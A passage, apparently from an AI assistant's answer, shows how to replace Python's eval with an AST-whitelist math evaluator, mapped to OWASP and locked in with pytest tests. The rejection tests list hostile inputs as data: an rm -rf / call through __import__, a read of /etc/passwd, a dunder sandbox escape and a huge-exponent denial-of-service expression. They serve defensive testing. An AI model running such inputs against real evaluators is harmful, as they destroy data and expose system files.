| `[x for x in range(10)]` | ❌ rejected | Comprehensions/iteration blocked |

The key lesson: the evaluator never touches `eval()`. It parses to an AST and only walks a whitelist of node types. Names starting with `_`, attribute access, calls to anything outside the allowed function set, and comprehensions all die at parse/whitelist time — before any code runs.

### 2. The safe Python pattern (drop-in replacement for `eval`)

```python
import ast, math, operator as op
from decimal import Decimal, InvalidOperation

BIN_OPS = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
           ast.Div: op.truediv, ast.FloorDiv: op.floordiv,
           ast.Mod: op.mod, ast.Pow: op.pow}
UNARY_OPS = {ast.UAdd: op.pos, ast.USub: op.neg}
SAFE_FUNCS = {"sqrt": math.sqrt, "abs": abs, "min": min, "max": max,
              "sin": math.sin, "cos": math.cos, "log": math.log,
              "round": round}
CONSTS = {"pi": math.pi, "e": math.e}

MAX_LEN, MAX_DEPTH, MAX_MAGNITUDE = 500, 30, 1e100

def safe_eval(expr: str, variables: dict) -> float:
    if len(expr) > MAX_LEN:
        raise ValueError("expression too long")
    tree = ast.parse(expr, mode="eval")
    if _depth(tree) > MAX_DEPTH:
        raise ValueError("expression too deeply nested")
    return _ev(tree.body, variables)

def _depth(node, d=1):
    return max([d] + [_depth(c, d + 1) for c in ast.iter_child_nodes(node)])

def _ev(node, variables):
    if isinstance(node, ast.Constant):
        if not isinstance(node.value, (int, float)):
            raise ValueError("only numeric literals allowed")
        return node.value
    if isinstance(node, ast.Name):
        if node.id.startswith("_"):
            raise ValueError("forbidden name")
        if node.id in variables:
            return variables[node.id]
        if node.id in CONSTS:
            return CONSTS[node.id]
        raise ValueError(f"unknown name: {node.id}")
    if isinstance(node, ast.BinOp):
        fn = BIN_OPS.get(type(node.op))
        if fn is None:
            raise ValueError("forbidden operator")
        return _bounded(fn(_ev(node.left, variables), _ev(node.right, variables)))
    if isinstance(node, ast.UnaryOp):
        fn = UNARY_OPS.get(type(node.op))
        if fn is None:
            raise ValueError("forbidden unary op")
        return _bounded(fn(_ev(node.operand, variables)))
    if isinstance(node, ast.Call):
        if not isinstance(node.func, ast.Name) or node.func.id not in SAFE_FUNCS:
            raise ValueError("forbidden function call")
        if node.keywords:
            raise ValueError("keyword args forbidden")
        return _bounded(SAFE_FUNCS[node.func.id](*[_ev(a, variables) for a in node.args]))
    raise ValueError(f"forbidden node type: {type(node).__name__}")

def _bounded(x):
    if isinstance(x, complex) or (isinstance(x, float) and (math.isnan(x) or math.isinf(x))):
        raise ValueError("non-finite or complex result")
    if abs(x) > MAX_MAGNITUDE:
        raise ValueError("result exceeds magnitude limit")
    return x
```

For financial math, swap `float` for `Decimal` in the constants/operators layer and avoid `Pow` on decimals.

### 3. Why this satisfies OWASP Top 10

- **A03 Injection** — the entire category for eval/exec-driven code execution is eliminated; input is whitelisted, not escaped.
- **A04 Insecure Design** — whitelist + depth/length/magnitude bounds = defense-in-depth against DoS (billion laughs, huge exponents, deep nesting).
- **A08 Software & Data Integrity** — controlled variable binding prevents attacker-supplied names from resolving to builtins or modules.
- **A09 Logging/Monitoring** — log every rejected `ValueError` with the raw expression (rate-limited) as security telemetry.
- **A06 Vulnerable Components** — if you use `simpleeval`/`asteval`, pin versions and scan for CVEs; the stdlib `ast` approach above has no third-party surface.

### 4. The OWASP hardening prompt I generated for your codebase

The `security-hardening-prompt-builder` produced a full assessment template (local risk tolerance, OWASP/NIST/ISO mapping, Python-specific checks for `eval`/`exec`/`pickle`/`subprocess`, and a risk matrix). It encodes nine concrete requirements — notably: never `eval`/`exec`/`compile` untrusted input, `ast.parse(mode='eval')` + node whitelist, reject `Attribute/Call/Import/Lambda/Comprehension/Subscript`, bound inputs/outputs, enforce length/depth limits, disable `__builtins__`/`globals`/`locals`, use `Decimal`/`int` for money, sanitize variable binding, and log rejections. Treat that document as your review checklist per PR.

### 5. Test cases to lock this in (pytest)

```python
import pytest
from yourmodule import safe_eval

SAFE = [("(100 * 3) + 8 * (100 * 3) / 100", {}, 324),
        ("price * quantity", {"price": 19.99, "quantity": 3}, 59.97),
        ("sqrt(144) + max(3, 7)", {}, 19)]
EVIL = ["__import__('os').system('rm -rf /')", "().__class__.__bases__",
        "open('/etc/passwd').read()", "[x for x in range(10)]",
        "9**999999999", "x" * 1000, "globals()"]

@pytest.mark.parametrize("expr,env,expected", SAFE)
def test_safe(expr, env, expected):
    assert safe_eval(expr, env) == pytest.approx(expected)

@pytest.mark.parametrize("expr", EVIL)
def test_rejected(expr):
    with pytest.raises(ValueError):
        safe_eval(expr, {})
```

### Bottom line

Secure math in Python = **never `eval`** → **parse to AST** → **walk a positive whitelist** → **bound everything** (length, depth, magnitude, finiteness) → **bind variables from a trusted dict only** → **log all rejections**. The validator tools above demonstrate the exact behavior you want: arithmetic (including variables and whitelisted functions) passes; anything touching dunders, attributes, imports, IO, or comprehensions is rejected before execution.
